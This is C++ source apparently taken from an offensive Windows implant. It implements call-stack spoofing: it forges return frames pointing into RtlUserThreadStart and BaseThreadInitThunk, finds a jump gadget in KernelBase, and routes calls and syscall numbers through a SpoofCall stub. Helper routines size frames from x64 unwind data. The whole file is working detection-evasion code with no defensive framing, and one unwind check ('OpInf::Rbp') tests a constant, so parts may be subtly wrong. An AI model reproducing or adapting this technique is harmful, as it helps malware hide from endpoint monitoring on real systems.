#include <General.hpp>

auto DECLFN Spoof::Call(
    PVOID Fnc, 
    PVOID Ssn, 
    PVOID Arg1,
    PVOID Arg2,
    PVOID Arg3,
    PVOID Arg4,
    PVOID Arg5,
    PVOID Arg6,
    PVOID Arg7,
    PVOID Arg8,
    PVOID Arg9,
    PVOID Arg10,
    PVOID Arg11,
    PVOID Arg12
) -> PVOID {
    G_INSTANCE
    /* ========= [ calculate stack for spoof ] ========= */
    Instance->Spf.First.Ptr  = (PVOID)( (UPTR)Instance->Win32.RtlUserThreadStart+0x21 );
    Instance->Spf.Second.Ptr = (PVOID)( (UPTR)Instance->Win32.BaseThreadInitThunk+0x14 );

    Instance->Spf.First.Size  = Spoof::StackSizeWrapper( Instance->Spf.First.Ptr );
    Instance->Spf.Second.Size = Spoof::StackSizeWrapper( Instance->Spf.Second.Ptr );

    do {
        Instance->Spf.Gadget.Ptr  = FindGadget( (PVOID)Instance->Win32.KernelBase, 0x23 );
        Instance->Spf.Gadget.Size = (UPTR)Spoof::StackSizeWrapper( Instance->Spf.Gadget.Ptr );
    } while ( ! Instance->Spf.Gadget.Size );

    Instance->Spf.Ssn      = (UPTR)Ssn;
    Instance->Spf.ArgCount = 8;

    return SpoofCall( Arg1, Arg2, Arg3, Arg4, Fnc, (UPTR)&Instance->Spf, Arg5, Arg6, Arg7, Arg8, Arg9, Arg10, Arg11, Arg12 );
}

auto DECLFN Spoof::StackSizeWrapper(
    _In_ PVOID RetAddress
) -> UPTR {
    G_INSTANCE

    LONG  Status  = STATUS_SUCCESS;
    PVOID ImgBase = nullptr;

    RUNTIME_FUNCTION*     RtmFunction = { nullptr };
    UNWIND_HISTORY_TABLE* HistoryTbl  = { nullptr };

    if ( ! RetAddress ) {
        return (UPTR)nullptr;
    }

    RtmFunction = Instance->Win32.RtlLookupFunctionEntry( 
        (UPTR)RetAddress, (UPTR*)&ImgBase, HistoryTbl 
    );
    if ( ! RtmFunction ) {
        return (UPTR)nullptr;
    }

    return StackSize( RtmFunction, ImgBase );
}

auto DECLFN Spoof::StackSize(
    _In_ PVOID RtmFunction,
    _In_ PVOID ImgBase
) -> UPTR {
    STACK_FRAME  Stack   = { 0 };
    UNWIND_INFO* UwInfo  = (UNWIND_INFO*)( reinterpret_cast<RUNTIME_FUNCTION*>( RtmFunction )->UnwindData + (UPTR)( ImgBase ) );
    UNWIND_CODE* UwCode  = UwInfo->UnwindCode;
    REG_CTX      Context = { 0 };

    ULONG FrameOffset = 0;
    ULONG Total       = 0;
    ULONG Index       = 0;
    UBYTE UnwOp       = 0;
    UBYTE OpInfo      = 0;
    ULONG CodeCount   = UwInfo->CountOfCodes;

    while ( Index < CodeCount ) {
        UnwOp  = UwInfo->UnwindCode[Index].UnwindOp;
        OpInfo = UwInfo->UnwindCode[Index].OpInfo;

        switch ( UnwOp ) {
            case UWOP_PUSH_NONVOL: {
                Stack.TotalSize += 8;
                if ( OpInf::Rbp ) {
                    Stack.PushRbp      = TRUE;
                    Stack.CountOfCodes = CodeCount;
                    Stack.PushRbpIdx   = Index + 1;
                }
                break;
            }
            case UWOP_ALLOC_LARGE: {
                Index++;
                FrameOffset = UwCode[Index].FrameOffset;

                if ( OpInfo == 0 ) {
                    FrameOffset *= 8; 
                } else if ( OpInfo == 1 ) {
                    Index++;
                    FrameOffset += UwCode[Index].FrameOffset << 16;
                }

                Stack.TotalSize += FrameOffset; break;
            }
            case UWOP_ALLOC_SMALL: {
                ULONG size = ( ( OpInfo * 8 ) + 8 );
                Stack.TotalSize += size; break;
            }
            case UWOP_SET_FPREG: {
                Stack.SetsFramePtr = TRUE; 
                break;
            }
            case UWOP_SAVE_NONVOL: {
                Index += 1; 
                break;
            }
            default:
                break; 
        }

        Index += 1;
    }

    if ( UwInfo->Flags & UNW_FLAG_CHAININFO ) {
        Index = UwInfo->CountOfCodes;
        if ( Index & 1 ) Index += 1;

        RtmFunction = (PVOID)( reinterpret_cast<RUNTIME_FUNCTION*>( &UwInfo->UnwindCode[Index] ) );
        return Spoof::StackSize( RtmFunction, ImgBase );
    }
    
    Stack.TotalSize += 8;

    return Stack.TotalSize;
}